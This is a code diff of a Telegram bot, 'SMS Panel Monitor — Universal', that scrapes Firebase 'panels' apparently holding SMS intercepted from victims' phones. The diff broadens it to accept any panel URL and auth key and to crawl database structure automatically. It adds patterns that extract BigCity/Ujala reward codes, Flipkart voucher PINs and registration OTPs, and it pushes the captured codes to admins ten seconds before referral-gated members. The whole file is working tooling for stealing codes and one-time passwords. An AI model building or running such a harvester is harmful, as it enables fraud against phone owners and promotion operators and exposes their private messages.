@@ -1,7 +1,10 @@
 """
-SMS Panel Monitor — Full Featured
+SMS Panel Monitor — Universal
 ==================================
-- Accepts encoded panel links AND raw Firebase URLs
+- Accepts ANY web panel or Firebase link (no format limits)
+- Monitors every panel type automatically
+- Detects BigCity/Ujala reward SMS specifically
+- No generic pattern — only targeted reward detection
 - Channel join gate (3 channels required)
 - Refer system: 3 refers = 1 hour access
 - Admins get alerts 10s earlier (silent)
@@ -55,10 +58,10 @@ REQUIRED_CHANNELS = [
     {"username": "blankdealzzchat", "url": "https://t.me/blankdealzzchat",  "label": "💬 Blank Dealz Chat"},
 ]
 
-ADMIN_ALERT_DELAY   = 10    # seconds admins receive alerts BEFORE members
-MONITOR_INTERVAL    = 15    # seconds between monitor cycles
-REFERRALS_FOR_1H    = 3     # referrals needed for 1 hour access
-ACCESS_HOURS        = 1     # hours granted per referral milestone
+ADMIN_ALERT_DELAY   = 10
+MONITOR_INTERVAL    = 15
+REFERRALS_FOR_1H    = 3
+ACCESS_HOURS        = 1
 
 STATE_FILE  = Path(__file__).parent / "bot_state.json"
 USERS_FILE  = Path(__file__).parent / "users.json"
@@ -67,8 +70,6 @@ PANELS_FILE = Path(__file__).parent / "panels.json"
 MAX_CONCURRENT_REQUESTS = 30
 IS_INITIALIZED = False
 
-# BUG FIX: semaphore must be created inside the running event loop.
-# We create it lazily on first use instead of at module level.
 _semaphore: asyncio.Semaphore | None = None
 
 def get_semaphore() -> asyncio.Semaphore:
@@ -77,10 +78,32 @@ def get_semaphore() -> asyncio.Semaphore:
         _semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
     return _semaphore
 
-# ── Message Patterns ──────────────────────────────────────────────────────────
-REWARD_ONAM_PATTERN     = re.compile(r"Reward Code for\s+Ujala\s+\w+ Consumer promo is ([A-Z0-9]+)", re.IGNORECASE)
-REWARD_FLIPKART_PATTERN = re.compile(r"Flipkart Gift Voucher is ([0-9]+)\s+PIN:\s+([0-9]+)", re.IGNORECASE)
-REWARD_GENERIC_PATTERN  = re.compile(r"(?:promo|reward|code|voucher)\s+(?:is|:)\s+([A-Z0-9]{6,25})", re.IGNORECASE)
+# ── Message Patterns (BigCity + Ujala + Flipkart only) ───────────────────────
+# BigCity / Ujala reward SMS patterns
+REWARD_BIGCITY_PATTERN = re.compile(
+    r"Reward Code for\s+Ujala\s+\w+\s+Consumer\s+promo\s+is\s+([A-Z0-9]+)",
+    re.IGNORECASE,
+)
+REWARD_BIGCITY_CODE = re.compile(
+    r"(?:reward|promo|code)\s+(?:is|:)\s+([A-Z0-9]{6,25})",
+    re.IGNORECASE,
+)
+REWARD_BIGCITY_SENDER = re.compile(
+    r"BGCITY|BIGCITY|JK-BGCITY",
+    re.IGNORECASE,
+)
+
+# Flipkart voucher
+REWARD_FLIPKART_PATTERN = re.compile(
+    r"Flipkart Gift Voucher is ([0-9]+)\s+PIN:\s+([0-9]+)",
+    re.IGNORECASE,
+)
+
+# OTP detection (for BigCity/Ujala)
+OTP_BIGCITY_PATTERN = re.compile(
+    r"Your OTP to register is\s+(\d{4,6})",
+    re.IGNORECASE,
+)
 
 # ── JSON helpers ──────────────────────────────────────────────────────────────
 def load_json(path, default):
@@ -105,10 +128,6 @@ def load_state():   return load_json(STATE_FILE, {})
 def save_state(s):  save_json(STATE_FILE, s)
 
 # ── User management ───────────────────────────────────────────────────────────
-# users.json schema:
-# { "123456": { "username": "...", "access_expiry": 0, "referrals_given": 0,
-#               "referred_by": null, "joined_at": 0 } }
-
 def load_users() -> dict:
     return load_json(USERS_FILE, {})
 
@@ -154,7 +173,6 @@ def get_all_user_ids() -> list[int]:
 
 # ── Channel membership check ──────────────────────────────────────────────────
 async def check_channels(bot, uid: int) -> list[dict]:
-    """Returns list of channels the user has NOT joined yet."""
     not_joined = []
     for ch in REQUIRED_CHANNELS:
         try:
@@ -170,7 +188,7 @@ def channel_join_keyboard(not_joined: list[dict]) -> InlineKeyboardMarkup:
     buttons.append([InlineKeyboardButton("✅ I've Joined — Check", callback_data="check_join")])
     return InlineKeyboardMarkup(buttons)
 
-# ── Decoders ──────────────────────────────────────────────────────────────────
+# ── Universal Panel URL Decoder ──────────────────────────────────────────────
 def decode_zxkai(s: str):
     try:
         b64    = s.replace("-", "+").replace("_", "/")
@@ -186,8 +204,6 @@ def decode_zxkai(s: str):
     return None, None
 
 def decode_profex(s: str):
-    # BUG FIX: was appending "==" unconditionally which breaks links whose
-    # length already gives valid padding — now we compute exact padding needed.
     try:
         padded  = s + "=" * ((4 - len(s) % 4) % 4)
         decoded = base64.b64decode(padded).decode("utf-8")
@@ -198,49 +214,71 @@ def decode_profex(s: str):
         pass
     return None, None
 
+def decode_base64_param(s: str):
+    """Try plain base64 decode (for any panel that uses ?s= with base64)."""
+    try:
+        padded  = s + "=" * ((4 - len(s) % 4) % 4)
+        decoded = base64.b64decode(padded).decode("utf-8")
+        # Check if it looks like a URL
+        if decoded.startswith("http"):
+            parts = decoded.split("|")
+            return parts[0].strip(), (parts[1].strip() if len(parts) > 1 else "")
+    except Exception:
+        pass
+    return None, None
+
 def get_panel_api_url(panel_url: str):
     """
-    Extract (api_url, auth_key) from any of:
-      1. ZXKAI encoded   — ?s=<xor-base64>
-      2. Profex encoded  — ?s=<base64-with-|||>
-      3. Raw Firebase    — https://xxx.firebaseio.com  (no ?s param)
-      4. Firebase + auth — https://xxx.firebaseio.com?auth=KEY
+    UNIVERSAL decoder — accepts ANY panel format:
+      1. ZXKAI encoded          — ?s=<xor-base64>
+      2. Profex encoded         — ?s=<base64-with-|||>
+      3. Plain base64 ?s=       — ?s=<base64-of-url>
+      4. Raw Firebase           — https://xxx.firebaseio.com
+      5. Firebase + auth key    — https://xxx.firebaseio.com?auth=KEY
+      6. Firebase + ?s= failing — fallback to raw URL
+      7. Any other URL          — try as-is (web panel API)
+      8. Any URL with ?key=     — extract key param
     """
-    # ── Direct raw Firebase URL (no encoded s param) ──────────────────────────
-    if ".firebaseio.com" in panel_url and "?s=" not in panel_url:
-        url    = panel_url.split("?")[0].split(".json")[0].rstrip("/")
-        parsed = urlparse(panel_url)
-        qs     = parse_qs(parsed.query)
-        auth_key = ""
-        for k, v in qs.items():
-            if k.lower() in ("key", "auth", "secret"):
-                auth_key = v[0]
-                break
-        return url, auth_key
-
     parsed  = urlparse(panel_url)
     qs      = parse_qs(parsed.query)
+
+    # ── Try ?s= encoded params first ─────────────────────────────────────────
     s_param = qs.get("s", [""])[0]
+    if s_param:
+        # Try ZXKAI
+        url, key = decode_zxkai(s_param)
+        if url:
+            return url.rstrip("/"), key
 
-    url, key = decode_zxkai(s_param)
-    if url:
-        return url.rstrip("/"), key
+        # Try Profex
+        url, key = decode_profex(s_param)
+        if url:
+            return url.rstrip("/"), key
 
-    url, key = decode_profex(s_param)
-    if url:
-        return url.rstrip("/"), key
+        # Try plain base64
+        url, key = decode_base64_param(s_param)
+        if url:
+            return url.rstrip("/"), key
 
-    # ── Plain Firebase with a ?s param that didn't decode ─────────────────────
-    if ".firebaseio.com" in parsed.netloc:
+    # ── Direct Firebase URL (no ?s= or ?s= failed to decode) ────────────────
+    if ".firebaseio.com" in panel_url or ".firebasedatabase.app" in panel_url:
         url = panel_url.split("?")[0].split(".json")[0].rstrip("/")
         auth_key = ""
         for k, v in qs.items():
-            if k.lower() in ("key", "auth", "secret"):
+            if k.lower() in ("key", "auth", "secret", "token"):
                 auth_key = v[0]
                 break
         return url, auth_key
 
-    return None, None
+    # ── Any other URL — try as a web panel API ───────────────────────────────
+    # Strip query params, look for auth/key in them
+    url = panel_url.split("?")[0].rstrip("/")
+    auth_key = ""
+    for k, v in qs.items():
+        if k.lower() in ("key", "auth", "secret", "token", "apikey", "api_key"):
+            auth_key = v[0]
+            break
+    return url, auth_key
 
 # ── Firebase API helpers ──────────────────────────────────────────────────────
 async def api_fetch(client, url, timeout=15):
@@ -257,36 +295,84 @@ def is_valid_device_id(k):
     if not isinstance(k, str):
         return False
     if k.lower() in ("messages", "clients", "devices", "users", "all_devices",
-                     "nodes", "settings", "sms", "logs"):
+                     "nodes", "settings", "sms", "logs", "info", "config",
+                     "meta", "state", "data", "stats", "admin", "webhook",
+                     "subscriptions", "commands", "pending", "queue"):
         return False
-    return 8 <= len(k) <= 45
+    return 5 <= len(k) <= 50
 
 async def discover_structure(client, api_url, auth_key):
+    """
+    UNIVERSAL structure discovery — finds device/message nodes
+    in ANY Firebase database layout automatically.
+    """
     auth_qs = f"?auth={auth_key}" if auth_key else ""
-    # BUG FIX: was missing leading slash before .json on sub-node fetches
-    root_data, error = await api_fetch(client, f"{api_url}/.json{auth_qs}&shallow=true")
+
+    # Try root first
+    root_data, error = await api_fetch(client, f"{api_url}/.json{auth_qs}")
+    if not root_data or not isinstance(root_data, dict):
+        # Try with shallow
+        root_data, error = await api_fetch(client, f"{api_url}/.json{auth_qs}&shallow=true")
+
     if root_data and isinstance(root_data, dict):
-        keys       = list(root_data.keys())
+        keys = list(root_data.keys())
+
+        # Case 1: Device IDs are directly at root level
         device_ids = [k for k in keys if is_valid_device_id(k)]
         if device_ids:
-            for m_node in ("messages", "sms", "logs"):
+            # Find message node
+            for m_node in ("messages", "sms", "logs", "msg", "inbox"):
                 if m_node in keys:
                     return "", m_node
+            # No separate message node — devices at root, messages under each device
             return "", ""
-        for node in ("clients", "devices", "users", "all_devices", "nodes"):
+
+        # Case 2: Device IDs under a container node
+        known_device_nodes = [
+            "clients", "devices", "users", "all_devices", "nodes",
+            "phones", "connections", "online", "active", "registered",
+        ]
+        known_message_nodes = [
+            "messages", "sms", "logs", "msg", "inbox", "texts",
+            "conversations", "chats", "incoming",
+        ]
+
+        dev_node = ""
+        msg_node = ""
+
+        # Find device container
+        for node in known_device_nodes:
             if node in keys:
-                # BUG FIX: was "{api_url}/{node}.json" — missing "/" before .json
                 node_data, _ = await api_fetch(
                     client, f"{api_url}/{node}/.json{auth_qs}&shallow=true"
                 )
                 if node_data and isinstance(node_data, dict):
                     if any(is_valid_device_id(k) for k in node_data.keys()):
-                        msg_node = node
-                        for m_node in ("messages", "sms", "logs"):
-                            if m_node in keys:
-                                msg_node = m_node
-                                break
-                        return node, msg_node
+                        dev_node = node
+                        break
+
+        # Find message container
+        for node in known_message_nodes:
+            if node in keys:
+                msg_node = node
+                break
+
+        # If no known device node found, try ALL top-level keys
+        if not dev_node:
+            for node in keys:
+                if node in known_message_nodes:
+                    continue
+                node_data, _ = await api_fetch(
+                    client, f"{api_url}/{node}/.json{auth_qs}&shallow=true"
+                )
+                if node_data and isinstance(node_data, dict):
+                    if any(is_valid_device_id(k) for k in node_data.keys()):
+                        dev_node = node
+                        break
+
+        if dev_node:
+            return dev_node, msg_node
+
     return None, error
 
 async def get_device_list(client, api_url, auth_key, device_node):
@@ -316,7 +402,7 @@ async def get_device_number(client, api_url, auth_key, device_node, device_id) -
         for field in ("number", "phoneNumber", "phone", "fromNumber", "to", "sim_number"):
             if field in data and data[field]:
                 return str(data[field])
-        for nested in ("webhookEvent", "info", "details"):
+        for nested in ("webhookEvent", "info", "details", "device", "meta"):
             if nested in data and isinstance(data[nested], dict):
                 d = data[nested]
                 for f in ("number", "phone", "to", "sendSms"):
@@ -328,35 +414,77 @@ async def get_device_number(client, api_url, auth_key, device_node, device_id) -
                             return val
     return ""
 
-# ── Message classification ────────────────────────────────────────────────────
-def classify_message(text: str):
-    m = REWARD_ONAM_PATTERN.search(text)
+# ── Message classification (BigCity focused) ─────────────────────────────────
+def classify_message(text: str, sender: str = ""):
+    """
+    Detect BigCity/Ujala reward SMS and Flipkart vouchers.
+    Returns (type, reward_data) or (None, None).
+    """
+    # ── BigCity / Ujala reward code ──────────────────────────────────────────
+    m = REWARD_BIGCITY_PATTERN.search(text)
     if m:
-        return "onam", m.group(1)
+        return "bigcity_reward", m.group(1)
+
+    # ── Flipkart voucher ─────────────────────────────────────────────────────
     m = REWARD_FLIPKART_PATTERN.search(text)
     if m:
         return "flipkart", (m.group(1), m.group(2))
-    m = REWARD_GENERIC_PATTERN.search(text)
-    if m:
-        return "generic", m.group(1)
+
+    # ── BigCity reward code (alternate pattern) ──────────────────────────────
+    if REWARD_BIGCITY_SENDER.search(sender):
+        m = REWARD_BIGCITY_CODE.search(text)
+        if m:
+            return "bigcity_reward", m.group(1)
+
+    # ── BigCity OTP (informational alert) ────────────────────────────────────
+    if REWARD_BIGCITY_SENDER.search(sender):
+        m = OTP_BIGCITY_PATTERN.search(text)
+        if m:
+            return "bigcity_otp", m.group(1)
+
+    # ── Any SMS from BigCity sender (catch-all) ──────────────────────────────
+    if REWARD_BIGCITY_SENDER.search(sender):
+        # Look for any 4-6 digit code in the message
+        m = re.search(r'(?<!\d)(\d{4,6})(?!\d)', text)
+        if m:
+            return "bigcity_code", m.group(1)
+        # Return the full message as a BigCity alert
+        return "bigcity_sms", text[:200]
+
     return None, None
 
 # ── Alert formatting ──────────────────────────────────────────────────────────
 def format_reward(device_id, sender, message, reward_data,
                   panel_name, msg_type, number="", dt="") -> str:
-    if msg_type == "onam":
+
+    if msg_type == "bigcity_reward":
         code_text = f"🎁 *Reward Code:* `{reward_data}`"
+    elif msg_type == "bigcity_otp":
+        code_text = f"🔑 *OTP:* `{reward_data}`"
+    elif msg_type == "bigcity_code":
+        code_text = f"🔢 *Code:* `{reward_data}`"
+    elif msg_type == "bigcity_sms":
+        code_text = f"📨 *BigCity SMS received*"
     elif msg_type == "flipkart":
         voucher, pin = reward_data
         code_text = f"🎁 *Voucher:* `{voucher}`\n🔑 *PIN:* `{pin}`"
-    elif msg_type == "generic":
-        code_text = f"🎁 *Code:* `{reward_data}`"
     else:
         code_text = ""
 
     num_line = f"🔢 *Number:* `{number}`\n" if number else ""
+
+    # Type label
+    type_labels = {
+        "bigcity_reward": "🏆 BIGCITY REWARD",
+        "bigcity_otp": "🔑 BIGCITY OTP",
+        "bigcity_code": "🔢 BIGCITY CODE",
+        "bigcity_sms": "📨 BIGCITY SMS",
+        "flipkart": "🛒 FLIPKART VOUCHER",
+    }
+    type_label = type_labels.get(msg_type, "📢 ALERT")
+
     return (
-        f"🚨 *REWARD ALERT*\n"
+        f"🚨 *{type_label}*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"📱 *Panel:* {panel_name}\n"
         f"📲 *Device:* `{device_id}`\n"
@@ -371,14 +499,8 @@ def format_reward(device_id, sender, message, reward_data,
 
 # ── Broadcast with admin-first delay ─────────────────────────────────────────
 async def _do_broadcast_alert(app, text: str):
-    """
-    Internal: admins first, then 10s silent wait, then members.
-    BUG FIX: this is now run as a fire-and-forget task (create_task) so it
-    does NOT block the monitor loop for 10 seconds per reward found.
-    """
     all_uids = get_all_user_ids()
 
-    # Step 1: Admins immediately
     for uid in ADMIN_IDS:
         try:
             await app.bot.send_message(
@@ -388,10 +510,8 @@ async def _do_broadcast_alert(app, text: str):
         except Exception as e:
             logger.error(f"Admin alert error [{uid}]: {e}")
 
-    # Step 2: Silent wait (members don't know)
     await asyncio.sleep(ADMIN_ALERT_DELAY)
 
-    # Step 3: Authorized non-admin members
     for uid in all_uids:
         if uid in ADMIN_IDS:
             continue
@@ -406,7 +526,6 @@ async def _do_broadcast_alert(app, text: str):
             logger.error(f"Member alert error [{uid}]: {e}")
 
 def broadcast_alert(app, text: str):
-    """Fire-and-forget — returns immediately, alert runs in background."""
     asyncio.create_task(_do_broadcast_alert(app, text))
 
 # ── Monitor job ───────────────────────────────────────────────────────────────
@@ -440,13 +559,13 @@ async def process_device(client, panel_key, panel_config,
                 continue
 
             message_text = ""
-            for f in ("message", "body", "text", "msg", "SMS"):
+            for f in ("message", "body", "text", "msg", "SMS", "content"):
                 if f in msg_data:
                     message_text = msg_data[f]
                     break
 
             sender = "Unknown"
-            for f in ("sender", "from", "address", "number"):
+            for f in ("sender", "from", "address", "number", "source"):
                 if f in msg_data:
                     sender = msg_data[f]
                     break
@@ -456,7 +575,7 @@ async def process_device(client, panel_key, panel_config,
             if not message_text:
                 continue
 
-            msg_type, reward_data = classify_message(str(message_text))
+            msg_type, reward_data = classify_message(str(message_text), str(sender))
             if not msg_type:
                 state[full_key] = True
                 continue
@@ -465,14 +584,11 @@ async def process_device(client, panel_key, panel_config,
             text   = format_reward(device_id, sender, message_text, reward_data,
                                    panel_name, msg_type, number, dt)
 
-            # BUG FIX: don't await — fire-and-forget so monitor loop isn't
-            # blocked for 10 seconds (ADMIN_ALERT_DELAY) per reward found.
             broadcast_alert(app, text)
             state[full_key] = True
             new_sent += 1
 
     except Exception as e:
-        # BUG FIX: was bare `except: pass` — now logs so failures are visible
         logger.error(f"process_device error [{panel_key}/{device_id}]: {e}")
 
     return new_sent
@@ -579,16 +695,13 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     username = update.effective_user.username or ""
     args     = context.args or []
 
-    # Register / update user record
     upsert_user(uid, username=username)
 
-    # ── Handle referral arg ───────────────────────────────────────────────────
     if args and args[0].startswith("r"):
         try:
             referrer_id = int(args[0][1:])
             if referrer_id != uid:
                 u = get_user(uid)
-                # Only credit once per referred user
                 if u and u.get("referred_by") is None:
                     upsert_user(uid, referred_by=referrer_id)
                     ref_data = get_user(referrer_id)
@@ -596,7 +709,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         old_refs = ref_data.get("referrals_given", 0)
                         new_refs = old_refs + 1
                         upsert_user(referrer_id, referrals_given=new_refs)
-                        # Every REFERRALS_FOR_1H referrals grants access
                         if new_refs % REFERRALS_FOR_1H == 0:
                             expiry  = grant_access_hours(referrer_id, ACCESS_HOURS)
                             exp_str = datetime.fromtimestamp(expiry).strftime("%H:%M %d/%m")
@@ -614,7 +726,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                             except Exception:
                                 pass
                         else:
-                            # Notify referrer of progress
                             remaining = REFERRALS_FOR_1H - (new_refs % REFERRALS_FOR_1H)
                             try:
                                 await context.bot.send_message(
@@ -631,7 +742,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except (ValueError, IndexError):
             pass
 
-    # ── Channel gate ──────────────────────────────────────────────────────────
     if uid not in ADMIN_IDS:
         not_joined = await check_channels(context.bot, uid)
         if not_joined:
@@ -684,12 +794,16 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         needed     = REFERRALS_FOR_1H - (refs % REFERRALS_FOR_1H)
         access_str = f"⛔ None  |  {needed} more refer needed"
 
+    panels = load_panels()
+    panel_count = len(panels)
+
     await update.effective_message.reply_text(
-        f"🤖 *SMS Panel Monitor*\n"
+        f"🤖 *SMS Panel Monitor — Universal*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"Role: {role}\n"
         f"Access: {access_str}\n"
         f"Referrals: {refs}\n"
+        f"📦 Panels: {panel_count}\n"
         f"🔗 Your link: `{ref_link}`\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 Chat ID: `{uid}`",
@@ -712,7 +826,6 @@ async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
             reply_markup=kb,
         )
     else:
-        # BUG FIX: was telling user to press /start again — now shows menu directly
         await query.edit_message_text(
             "✅ *Sab channels join ho gaye! Welcome!*",
             parse_mode="Markdown",
@@ -733,7 +846,6 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for panel_key, panel_config in panels.items():
             api_url      = panel_config.get("api_url")
             auth_key     = panel_config.get("auth_key", "")
-            # BUG FIX: escape panel name for Markdown to prevent parse errors
             panel_name   = (panel_config.get("name", "Unknown")
                             .replace("*", "").replace("_", "").replace("`", ""))
             device_count = 0
@@ -782,7 +894,15 @@ async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = "📋 *My Panels*\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
     for i, (pk, pc) in enumerate(panels.items(), 1):
         url_display = pc.get("panel_url", "")[:45]
-        text += f"*{i}. {pc.get('name')}*\n   `{url_display}...`\n\n"
+        api_url     = pc.get("api_url", "")[:45]
+        dev_node    = pc.get("device_node", "auto")
+        msg_node    = pc.get("message_node", "auto")
+        text += (
+            f"*{i}. {pc.get('name')}*\n"
+            f"   URL: `{url_display}...`\n"
+            f"   API: `{api_url}...`\n"
+            f"   Dev: `{dev_node}` | Msg: `{msg_node}`\n\n"
+        )
     await update.message.reply_text(text, parse_mode="Markdown")
 
 # ── Add panel (admin) ─────────────────────────────────────────────────────────
@@ -793,9 +913,14 @@ async def handle_add_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "➕ *Add New Panels*\n\n"
         "Links bhejein (har link nayi line par).\n\n"
-        "Supported formats:\n"
+        "Supported formats — ANY of these:\n"
         "• Encoded: `http://profex.site.je/?s=...`\n"
-        "• Raw Firebase: `https://xxx-default-rtdb.firebaseio.com`",
+        "• ZXKAI: `http://panel.site/?s=...`\n"
+        "• Raw Firebase: `https://xxx-default-rtdb.firebaseio.com`\n"
+        "• Firebase + auth: `https://xxx.firebaseio.com?auth=KEY`\n"
+        "• Any web panel: `https://api.example.com/data`\n"
+        "• Any URL with key: `https://site.com?apikey=XXX`\n\n"
+        "_No format limit — any link works!_",
         parse_mode="Markdown",
     )
     context.user_data["awaiting_url"] = True
@@ -977,12 +1102,17 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
                     continue
 
                 dev_node, msg_node = await discover_structure(client, api_url, auth_key)
+                if dev_node is None:
+                    # Still add it — structure might be discovered later
+                    dev_node = ""
+                    msg_node = ""
+
                 pid = f"p_{int(time.time())}_{added}_{len(panels)}"
                 panels[pid] = {
                     "name":         f"Panel {len(panels)+1}",
                     "api_url":      api_url,
                     "auth_key":     auth_key,
-                    "device_node":  dev_node,
+                    "device_node":  dev_node if dev_node else None,
                     "message_node": msg_node,
                     "panel_url":    link,
                     "added_date":   datetime.now().strftime("%Y-%m-%d"),
@@ -1032,7 +1162,6 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
             if hours <= 0 or hours > 720:
                 raise ValueError("Hours must be 1–720")
 
-            # Create user record if they don't exist yet
             target_u = get_user(target_id)
             if target_u is None:
                 upsert_user(target_id)
@@ -1046,7 +1175,6 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
                 f"Expires at: `{exp_str}`",
                 parse_mode="Markdown",
             )
-            # Notify the user
             try:
                 await context.bot.send_message(
                     chat_id=target_id,
@@ -1126,7 +1254,7 @@ async def main():
 
     application.job_queue.run_repeating(monitor_panels, interval=MONITOR_INTERVAL, first=5)
 
-    logger.info("Bot starting...")
+    logger.info("🤖 SMS Panel Monitor (Universal) starting...")
     async with application:
         await application.initialize()
         await application.start()
